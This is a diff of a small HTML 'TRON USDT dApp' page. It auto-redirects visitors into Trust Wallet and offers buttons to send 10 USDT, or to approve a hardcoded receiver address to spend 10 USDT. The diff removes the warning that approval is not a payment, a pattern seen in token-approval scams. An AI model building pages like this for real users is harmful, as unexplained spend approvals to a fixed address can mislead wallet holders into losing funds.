@@ -26,19 +26,14 @@
       text-align: center;
     }
 
-    .title {
-      font-size: 20px;
-      margin-bottom: 15px;
-    }
-
     .btn {
       width: 100%;
       padding: 14px;
       border-radius: 12px;
       border: none;
       font-size: 16px;
-      cursor: pointer;
       margin-top: 10px;
+      cursor: pointer;
     }
 
     .connect { background: #3b82f6; }
@@ -52,94 +47,103 @@
       word-break: break-all;
     }
 
-    .info {
-      font-size: 12px;
-      color: #9ca3af;
+    .status {
       margin-top: 10px;
+      font-size: 13px;
+      color: #9ca3af;
     }
   </style>
 </head>
 
 <body>
 
-  <div class="card">
+<div class="card">
 
-    <div class="title">TRON USDT dApp</div>
+  <h3>TRON USDT dApp</h3>
 
-    <!-- CONNECT BUTTON -->
-    <button id="connectBtn" class="btn connect" onclick="connectWallet()">
-      Connect TRON Wallet
-    </button>
+  <div id="status" class="status">Checking wallet...</div>
 
-    <!-- WALLET ADDRESS -->
-    <div id="address" class="address"></div>
+  <button id="connectBtn" class="btn connect" onclick="connectWallet()" style="display:none;">
+    Connect Wallet
+  </button>
 
-    <!-- ACTION BUTTONS -->
-    <div id="actions" style="display:none;">
-      <button class="btn pay" onclick="pay()">Send 10 USDT</button>
-      <button class="btn approve" onclick="approve()">Approve 10 USDT</button>
+  <div id="address" class="address"></div>
 
-      <div class="info">
-        Approval allows spending later. This is NOT a payment.
-      </div>
-    </div>
-
+  <div id="actions" style="display:none;">
+    <button class="btn pay" onclick="pay()">Send 10 USDT</button>
+    <button class="btn approve" onclick="approve()">Approve 10 USDT</button>
   </div>
 
-  <script>
-    const receiver = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
-    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const AMOUNT = 10 * 1e6;
+</div>
 
-    // 🔥 Auto open inside Trust Wallet if not already
-    window.onload = () => {
-      if (!window.tronWeb) {
-        const url = encodeURIComponent(window.location.href);
-        window.location.href = `https://link.trustwallet.com/open_url?url=${url}`;
-      }
-    };
+<script>
+const receiver = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
+const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const AMOUNT = 10 * 1e6;
 
-    // ✅ Connect Wallet
-    function connectWallet() {
-      if (!window.tronWeb) {
-        alert("Opening Trust Wallet...");
-        return;
-      }
+let redirected = false;
 
-      const address = window.tronWeb.defaultAddress.base58;
+// 🔥 WAIT for tronWeb injection
+function waitForTronWeb() {
+  let tries = 0;
 
-      if (!address) {
-        alert("Please unlock wallet");
-        return;
-      }
-
-      document.getElementById("address").innerText =
-        "Connected: " + address;
-
-      document.getElementById("connectBtn").style.display = "none";
-      document.getElementById("actions").style.display = "block";
+  const interval = setInterval(() => {
+    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+      clearInterval(interval);
+      onWalletReady();
     }
 
-    // ✅ Payment
-    function pay() {
-      const url = `https://link.trustwallet.com/send?coin=195&address=${receiver}&amount=10`;
-      window.location.href = url;
+    tries++;
+
+    // After ~2 seconds → redirect once
+    if (tries > 10 && !redirected) {
+      redirected = true;
+
+      const url = encodeURIComponent(window.location.href);
+      window.location.href = `https://link.trustwallet.com/open_url?url=${url}`;
+      clearInterval(interval);
     }
 
-    // ⚠️ Approval
-    function approve() {
-      if (!window.tronWeb) {
-        alert("Wallet not detected");
-        return;
-      }
+  }, 200);
+}
 
-      window.tronWeb.contract().at(CONTRACT).then(contract => {
-        contract.approve(receiver, AMOUNT).send({
-          feeLimit: 100000000
-        });
-      });
-    }
-  </script>
+function onWalletReady() {
+  document.getElementById("status").innerText = "Wallet detected";
+
+  document.getElementById("connectBtn").style.display = "block";
+}
+
+function connectWallet() {
+  const address = window.tronWeb.defaultAddress.base58;
+
+  if (!address) {
+    alert("Unlock your wallet first");
+    return;
+  }
+
+  document.getElementById("address").innerText = "Connected: " + address;
+  document.getElementById("connectBtn").style.display = "none";
+  document.getElementById("actions").style.display = "block";
+}
+
+// ✅ Payment
+function pay() {
+  const url = `https://link.trustwallet.com/send?coin=195&address=${receiver}&amount=10`;
+  window.location.href = url;
+}
+
+// ⚠️ Approval
+function approve() {
+  window.tronWeb.contract().at(CONTRACT).then(contract => {
+    contract.approve(receiver, AMOUNT).send({
+      feeLimit: 100000000
+    });
+  });
+}
+
+// Start detection
+waitForTronWeb();
+</script>
 
 </body>
 </html>
